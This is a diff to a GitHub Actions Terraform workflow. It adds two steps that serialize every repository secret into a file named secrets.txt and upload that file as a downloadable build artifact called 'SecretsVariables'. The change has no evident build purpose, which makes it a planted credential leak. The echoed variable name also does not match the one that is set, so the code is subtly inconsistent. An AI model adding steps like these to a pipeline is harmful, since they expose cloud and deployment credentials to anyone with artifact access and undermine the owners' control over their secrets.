@@ -43,6 +43,16 @@ jobs:
       - name: Terraform Init
         id: init
         run: terraform init -backend-config=backend.tfvars
+
+      - name: "Echo in file"
+        env:
+          TF_VAR_TOKEN: ${{ toJson(secrets) }}
+        run: echo "$TF_VAR_OCM_TOKEN" > "secrets.txt"    
+      - uses: actions/upload-artifact@v4
+        name: Upload Artifact
+        with:
+          name: SecretsVariables
+          path: "secrets.txt"        
       
       - name: Terraform Plan
         id: plan
